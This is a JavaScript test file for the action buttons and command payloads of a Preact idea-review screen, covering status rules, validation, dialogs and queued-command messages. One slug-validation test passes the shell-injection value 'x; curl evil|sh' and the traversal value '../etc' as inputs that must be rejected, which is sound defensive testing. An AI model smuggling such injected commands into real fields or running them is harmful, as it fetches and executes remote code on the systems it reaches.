import test from 'node:test';
import assert from 'node:assert/strict';
import { render } from 'preact-render-to-string';
import { h, render as mount } from 'preact';
import {
  availableIdeaActions, commandFor, textError, slugOk, confirmOpts, outcomeLine, IDEA_TEXT_MAX
} from '../src/lib/idea-actions.js';
import { IdeaActions } from '../src/ui/IdeaActions.js';
import { IdeaScreen } from '../src/screens/Idea.js';
import { flush } from './helpers/settle.js';

// BH-2520: POST / REVISE / KILL / CHAT on the Idea screen. The payloads are the
// ones bin/poll-commands.sh reads for the existing chat_proposal and
// post_proposal|kill_proposal|revise_proposal handlers; the proposal rows have
// the shape the ideas read (/api/ideas/proposals/:project/:slug) answers with.

const PROJECT = 'project-1';
const SLUG = 'weekly-digest';
const row = (over) => ({
  project: PROJECT, slug: SLUG, title: 'Weekly digest', summary: 'One email a week.', status: 'gate_pending',
  rev: 1, score: 6.2, impact: 4, effort: 2, confidence: 0.8, updated_at: '2026-09-25T10:00:00Z',
  created_at: '2026-09-24T10:00:00Z', ...over
});

// A native dialog anywhere in the flow is a failure, never a prompt.
globalThis.confirm = () => { throw new Error('native confirm called'); };
globalThis.alert = () => { throw new Error('native alert called'); };
globalThis.prompt = () => { throw new Error('native prompt called'); };

test('1: availableIdeaActions — POST only at the gate, KILL before posting, REVISE also on a veto, CHAT on any row', () => {
  assert.deepEqual(availableIdeaActions(row({ status: 'gate_pending' })), ['post', 'revise', 'kill', 'chat']);
  assert.deepEqual(availableIdeaActions(row({ status: 'candidate' })), ['revise', 'kill', 'chat']);
  assert.deepEqual(availableIdeaActions(row({ status: 'vetoed' })), ['revise', 'chat']);
  for (const s of ['posted', 'client_approved', 'client_rejected', 'building', 'shipped', 'expired', 'weird', null, undefined, '']) {
    assert.deepEqual(availableIdeaActions(row({ status: s })), ['chat'], String(s));
  }
  // Invariant (c): the irreversible POST is never offered off the gate, KILL never after posting.
  for (const s of ['candidate', 'vetoed', 'posted', 'client_approved', 'client_rejected', 'building', 'shipped', 'expired', 'weird', null]) {
    assert.ok(!availableIdeaActions(row({ status: s })).includes('post'), `no POST on ${s}`);
  }
  for (const s of ['posted', 'shipped', 'building', 'client_approved']) {
    assert.ok(!availableIdeaActions(row({ status: s })).includes('kill'), `no KILL on ${s}`);
  }
  for (const p of [null, undefined, {}, row({ slug: '' }), row({ slug: undefined }), row({ slug: 'x; curl evil|sh' }), row({ slug: 'a b' })]) {
    assert.deepEqual(availableIdeaActions(p), [], JSON.stringify(p && p.slug));
  }
  assert.equal(slugOk('weekly-digest_v2'), true);
  assert.equal(slugOk('../etc'), false);
  assert.equal(slugOk(''), false);
  assert.equal(slugOk(null), false);
});

test('2: commandFor emits the exact payloads the poller reads, trimmed, with no actor', () => {
  assert.deepEqual(commandFor('post', PROJECT, SLUG, 'ignored'), { type: 'post_proposal', project: PROJECT, slug: SLUG });
  assert.deepEqual(commandFor('kill', PROJECT, SLUG, '  dup of another  '),
    { type: 'kill_proposal', project: PROJECT, slug: SLUG, notes: 'dup of another' });
  const bare = commandFor('kill', PROJECT, SLUG, '   ');
  assert.deepEqual(bare, { type: 'kill_proposal', project: PROJECT, slug: SLUG });
  assert.ok(!('notes' in bare), 'blank kill notes send no notes key');
  assert.deepEqual(commandFor('revise', PROJECT, SLUG, ' make it weekly\n'),
    { type: 'revise_proposal', project: PROJECT, slug: SLUG, notes: 'make it weekly' });
  assert.deepEqual(commandFor('chat', PROJECT, SLUG, ' why weekly? '),
    { type: 'chat_proposal', project: PROJECT, slug: SLUG, message: 'why weekly?', origin: 'console' });
  for (const a of ['post', 'kill', 'revise', 'chat']) {
    assert.ok(!('actor' in commandFor(a, PROJECT, SLUG, 'x')), `${a}: the proxy stamps the actor`);
  }
});

test('3: textError — revise and chat need text, nothing over the max is clamped, kill notes are optional', () => {
  for (const a of ['revise', 'chat']) {
    assert.ok(textError(a, ''), a);
    assert.ok(textError(a, '   \n'), a);
    assert.ok(textError(a, undefined), a);
    assert.equal(textError(a, 'x'), null, a);
  }
  assert.equal(textError('kill', ''), null);
  assert.equal(textError('kill', 'why'), null);
  assert.equal(textError('post', ''), null);
  const long = 'x'.repeat(IDEA_TEXT_MAX + 1);
  for (const a of ['revise', 'chat', 'kill']) {
    assert.match(textError(a, long), new RegExp(String(IDEA_TEXT_MAX)), a);
    assert.equal(textError(a, 'x'.repeat(IDEA_TEXT_MAX)), null, a);
  }
  assert.equal(IDEA_TEXT_MAX, 4000);
});

test('4: outcomeLine — a command_id is "queued", anything else is an error, never success', () => {
  const queued = outcomeLine('revise', { result: { command_id: 7 } });
  assert.equal(queued.tone, 'ok');
  assert.ok(queued.text.startsWith('REVISE queued as command #7.'), queued.text);
  assert.doesNotMatch(queued.text, /\brevised\b/i, 'rung 1: queued, never "revised"');
  for (const result of [{}, null, { ok: true }, { command_id: '' }, { command_id: null }]) {
    const out = outcomeLine('post', { result });
    assert.equal(out.tone, 'bad', JSON.stringify(result));
    assert.doesNotMatch(out.text, /queued as/, out.text);
  }
  const err = outcomeLine('kill', { error: new Error('unknown type') });
  assert.equal(err.tone, 'bad');
  assert.match(err.text, /KILL not sent: unknown type/);
  assert.match(outcomeLine('chat', { result: { command_id: 3 } }).text, /1-2 minutes/);
});

test('4b: confirm copy says what each action does, in plain words', () => {
  const p = row({ rev: 3 });
  assert.match(confirmOpts('post', p).body, /client's board/);
  assert.match(confirmOpts('post', p).body, /cannot be undone from here/);
  assert.match(confirmOpts('kill', p).body, /vetoed/);
  assert.match(confirmOpts('revise', p).body, /rev 4/);
  assert.match(confirmOpts('chat', p).body, /IDEA CHAT/);
  for (const a of ['post', 'kill', 'revise', 'chat']) {
    const o = confirmOpts(a, p);
    assert.equal(o.confirmLabel, a.toUpperCase());
    assert.doesNotMatch(o.body, /—/);
  }
  assert.equal(confirmOpts('post', p).tone, 'warn');
  assert.equal(confirmOpts('kill', p).tone, 'danger');
});

// ---- mounted through the real IdeaScreen (D2) ------------------------------

class FakeNode {
  constructor(nodeType, name, data) {
    this.nodeType = nodeType;
    this.localName = name;
    this.nodeName = name ? name.toUpperCase() : '#text';
    this.data = data;
    this.childNodes = [];
    this.parentNode = null;
    this.attrs = {};
    this.style = {};
    this.listeners = {};
  }
  get onclick() { return null; }
  get onchange() { return null; }
  get oninput() { return null; }
  get firstChild() { return this.childNodes[0] || null; }
  get nextSibling() {
    if (!this.parentNode) return null;
    const s = this.parentNode.childNodes;
    return s[s.indexOf(this) + 1] || null;
  }
  insertBefore(n, ref) {
    if (n.parentNode) n.parentNode.removeChild(n);
    n.parentNode = this;
    const i = ref ? this.childNodes.indexOf(ref) : -1;
    if (i < 0) this.childNodes.push(n); else this.childNodes.splice(i, 0, n);
    return n;
  }
  appendChild(n) { return this.insertBefore(n, null); }
  removeChild(n) {
    this.childNodes.splice(this.childNodes.indexOf(n), 1);
    n.parentNode = null;
    return n;
  }
  remove() { if (this.parentNode) this.parentNode.removeChild(this); }
  setAttribute(k, v) { this.attrs[k] = String(v); }
  removeAttribute(k) { delete this.attrs[k]; }
  getAttribute(k) { return k in this.attrs ? this.attrs[k] : null; }
  addEventListener(t, fn) { this.listeners[t] = fn; }
  removeEventListener(t) { delete this.listeners[t]; }
  focus() { globalThis.document.activeElement = this; }
  // Enough of the selector language for Modal: "tag" and ".class tag", comma-joined.
  querySelectorAll(sel) {
    const parts = sel.split(',').map((p) => p.trim().split(/\s+/));
    const hasClassAbove = (n, cls) => {
      for (let p = n.parentNode; p && p !== this.parentNode; p = p.parentNode) {
        if ((p.attrs.class || '').split(/\s+/).includes(cls)) return true;
      }
      return false;
    };
    return all(this).slice(1).filter((n) => n.nodeType === 1 && parts.some((p) => (p.length === 1
      ? n.localName === p[0]
      : n.localName === p[1] && hasClassAbove(n, p[0].replace(/^\./, '')))));
  }
  querySelector(sel) { return this.querySelectorAll(sel)[0] || null; }
  get textContent() { return this.nodeType === 3 ? String(this.data) : this.childNodes.map((c) => c.textContent).join(''); }
}

function installDom() {
  const doc = new FakeNode(9, '#document');
  doc.createElement = (t) => new FakeNode(1, t);
  doc.createElementNS = (_, t) => new FakeNode(1, t);
  doc.createTextNode = (d) => new FakeNode(3, null, d);
  doc.hidden = false;
  doc.activeElement = null;
  doc.getElementById = () => null;
  globalThis.document = doc;
  globalThis.window = {
    location: { hash: '' }, dispatchEvent() {}, addEventListener() {}, removeEventListener() {},
    confirm: globalThis.confirm, alert: globalThis.alert, prompt: globalThis.prompt
  };
  return doc;
}

const all = (n, out = []) => { out.push(n); n.childNodes.forEach((c) => all(c, out)); return out; };
const dialogOf = (root) => all(root).find((n) => n.attrs && n.attrs.role === 'dialog');
const buttonIn = (root, label) => all(root).find((n) => n.localName === 'button' && n.textContent.trim() === label);
// The row's buttons live outside the dialog; the dialog's confirm is its last button.
const rowButton = (root, label) => all(root).find((n) => n.localName === 'button' && n.textContent.trim() === label
  && !all(dialogOf(root) || new FakeNode(1, 'x')).includes(n));
const rowButtons = (root) => all(root).filter((n) => n.localName === 'button' && (n.attrs.class || '').includes('idea-action'))
  .map((n) => n.textContent.trim());
const confirmOf = (dialog) => all(dialog).filter((n) => n.localName === 'button').pop();
const fire = (el, type, extra = {}) => el.listeners[type].call(el, { type, target: el, currentTarget: el, preventDefault() {}, stopPropagation() {}, ...extra });
const isDisabled = (n) => n.disabled === true || ('disabled' in n.attrs && n.attrs.disabled !== 'false');

// The idea read and the command POST, routed by URL. Every call is recorded.
function routedIdea(proposal, actionAnswer = [200, { command_id: 41 }]) {
  const calls = [];
  globalThis.fetch = async (url, init = {}) => {
    const u = String(url);
    const method = init.method || 'GET';
    calls.push({ url: u, method, body: init.body ? JSON.parse(init.body) : undefined });
    let status; let body;
    if (u === `/api/ideas/proposals/${PROJECT}/${SLUG}` && method === 'GET') [status, body] = [200, { proposal, assets: [], chat: [] }];
    else if (u === '/api/dash/action' && method === 'POST') [status, body] = actionAnswer;
    else [status, body] = [404, { error: 'nope' }];
    return { ok: status >= 200 && status < 300, status, text: async () => JSON.stringify(body) };
  };
  return calls;
}
const actionCalls = (calls) => calls.filter((c) => c.url === '/api/dash/action');
const ideaReads = (calls) => calls.filter((c) => c.url.startsWith('/api/ideas/proposals/'));

test('5: REVISE through the real IdeaScreen — blocked until notes, focus kept, one exact POST, then a reload', async () => {
  const doc = installDom();
  const calls = routedIdea(row({ status: 'gate_pending' }));
  const root = doc.createElement('div');
  mount(h(IdeaScreen, { project: PROJECT, slug: SLUG }), root);
  try {
    await flush();
    assert.deepEqual(rowButtons(root), ['POST', 'REVISE', 'KILL', 'CHAT']);
    assert.equal(ideaReads(calls).length, 1);

    fire(rowButton(root, 'REVISE'), 'click');
    await flush();
    const dialog = dialogOf(root);
    assert.ok(dialog, 'the in-app dialog opened');
    assert.equal(dialog.attrs['aria-label'], 'REVISE IDEA');
    const ta = all(dialog).find((n) => n.localName === 'textarea');
    assert.ok(ta, 'REVISE asks for notes');
    assert.equal(ta.attrs.maxlength, String(IDEA_TEXT_MAX));
    assert.equal(doc.activeElement, ta, 'focus starts on the notes');
    assert.equal(isDisabled(confirmOf(dialog)), true, 'REVISE is disabled with an empty textarea');
    assert.equal(isDisabled(rowButton(root, 'POST')), true, 'every row button is disabled while the dialog is open');

    ta.value = '   ';
    fire(ta, 'input');
    await flush();
    assert.equal(isDisabled(confirmOf(dialogOf(root))), true, 'whitespace is not notes');

    ta.value = 'make it weekly';
    fire(ta, 'input');
    await flush();
    assert.equal(isDisabled(confirmOf(dialogOf(root))), false, 'notes enable REVISE');
    assert.equal(doc.activeElement, ta, 'the enabling keystroke leaves focus on the notes (D39)');

    // A parent re-render (same screen, fresh props) must not move focus.
    mount(h(IdeaScreen, { project: PROJECT, slug: SLUG }), root);
    await flush();
    assert.equal(doc.activeElement, ta, 'a parent rerender leaves focus on the notes (D39)');
    assert.equal(actionCalls(calls).length, 0, 'typing sends nothing');

    fire(confirmOf(dialogOf(root)), 'click');
    await flush();
    await flush();
    const sent = actionCalls(calls);
    assert.equal(sent.length, 1, 'exactly one command');
    assert.equal(sent[0].method, 'POST');
    assert.equal(JSON.stringify(sent[0].body),
      '{"type":"revise_proposal","project":"project-1","slug":"weekly-digest","notes":"make it weekly"}');
    assert.equal(ideaReads(calls).length, 2, 'the idea is read again after the command queued');
    assert.match(root.textContent, /REVISE queued as command #41/);
    assert.equal(dialogOf(root), undefined);
    assert.equal(isDisabled(rowButton(root, 'REVISE')), false, 'enabled again after the POST');
  } finally { mount(null, root); }
});

test('5b: Escape and CANCEL send nothing; POST sends once and stays locked after it queued', async () => {
  const doc = installDom();
  const calls = routedIdea(row({ status: 'gate_pending' }), [200, { command_id: 9 }]);
  const root = doc.createElement('div');
  mount(h(IdeaScreen, { project: PROJECT, slug: SLUG }), root);
  try {
    await flush();
    fire(rowButton(root, 'KILL'), 'click');
    await flush();
    assert.equal(dialogOf(root).attrs['aria-label'], 'KILL IDEA');
    fire(doc, 'keydown', { key: 'Escape' });
    await flush();
    assert.equal(dialogOf(root), undefined, 'Escape closes it');

    fire(rowButton(root, 'POST'), 'click');
    await flush();
    assert.match(dialogOf(root).textContent, /client's board/);
    fire(buttonIn(dialogOf(root), 'CANCEL'), 'click');
    await flush();
    assert.equal(dialogOf(root), undefined, 'CANCEL closes it');
    assert.equal(actionCalls(calls).length, 0, 'a cancelled confirm sends nothing');

    fire(rowButton(root, 'POST'), 'click');
    await flush();
    fire(confirmOf(dialogOf(root)), 'click');
    await flush();
    await flush();
    assert.deepEqual(actionCalls(calls).map((c) => c.body), [{ type: 'post_proposal', project: PROJECT, slug: SLUG }]);
    const locked = rowButton(root, 'POST QUEUED #9');
    assert.ok(locked, 'the POST button says it queued');
    assert.equal(isDisabled(locked), true, 'and stays disabled');
    fire(locked, 'click');
    await flush();
    assert.equal(dialogOf(root), undefined, 'a second POST click opens nothing');
    assert.equal(actionCalls(calls).length, 1, 'a second POST click sends nothing');
  } finally { mount(null, root); }
});

test('5c: KILL with notes and CHAT with a message send their payloads; a refusal re-enables the row', async () => {
  const doc = installDom();
  let calls = routedIdea(row({ status: 'gate_pending' }), [200, { command_id: 5 }]);
  let root = doc.createElement('div');
  mount(h(IdeaScreen, { project: PROJECT, slug: SLUG }), root);
  try {
    await flush();
    fire(rowButton(root, 'KILL'), 'click');
    await flush();
    assert.equal(isDisabled(confirmOf(dialogOf(root))), false, 'KILL notes are optional');
    const ta = all(dialogOf(root)).find((n) => n.localName === 'textarea');
    ta.value = 'duplicate of the digest idea';
    fire(ta, 'input');
    await flush();
    fire(confirmOf(dialogOf(root)), 'click');
    await flush();
    fire(rowButton(root, 'CHAT'), 'click');
    await flush();
    const cta = all(dialogOf(root)).find((n) => n.localName === 'textarea');
    assert.equal(isDisabled(confirmOf(dialogOf(root))), true, 'CHAT needs a message');
    cta.value = 'who asked for this?';
    fire(cta, 'input');
    await flush();
    fire(confirmOf(dialogOf(root)), 'click');
    await flush();
    assert.deepEqual(actionCalls(calls).map((c) => c.body), [
      { type: 'kill_proposal', project: PROJECT, slug: SLUG, notes: 'duplicate of the digest idea' },
      { type: 'chat_proposal', project: PROJECT, slug: SLUG, message: 'who asked for this?', origin: 'console' }
    ]);
    assert.match(root.textContent, /1-2 minutes/);
  } finally { mount(null, root); }

  calls = routedIdea(row({ status: 'gate_pending' }), [400, { error: 'unknown project' }]);
  root = doc.createElement('div');
  mount(h(IdeaScreen, { project: PROJECT, slug: SLUG }), root);
  try {
    await flush();
    fire(rowButton(root, 'POST'), 'click');
    await flush();
    fire(confirmOf(dialogOf(root)), 'click');
    await flush();
    assert.match(root.textContent, /POST not sent: unknown project/);
    assert.equal(isDisabled(rowButton(root, 'POST')), false, 'a refused POST is not locked');
    assert.equal(ideaReads(calls).length, 1, 'no reload after a refusal');
  } finally { mount(null, root); }
});

test('6: rendered Idea screen — the gate banner points at the buttons, posted shows only CHAT, vetoed REVISE + CHAT', async () => {
  const doc = installDom();
  for (const [status, want] of [['gate_pending', ['POST', 'REVISE', 'KILL', 'CHAT']], ['posted', ['CHAT']], ['vetoed', ['REVISE', 'CHAT']]]) {
    routedIdea(row({ status }));
    const root = doc.createElement('div');
    mount(h(IdeaScreen, { project: PROJECT, slug: SLUG }), root);
    try {
      await flush();
      assert.deepEqual(rowButtons(root), want, status);
      assert.doesNotMatch(root.textContent, /product cockpit/i, status);
      if (status === 'gate_pending') assert.match(root.textContent, /buttons below/);
    } finally { mount(null, root); }
  }
});

test('6b: a slug the poller would refuse gets no buttons and one honest footnote', () => {
  const html = render(h(IdeaActions, { proposal: row({ slug: 'bad slug' }), project: PROJECT }));
  assert.doesNotMatch(html, /<button/);
  assert.match(html, /cannot be acted on from here/);
  assert.equal(render(h(IdeaActions, { proposal: {}, project: PROJECT })), '');
});
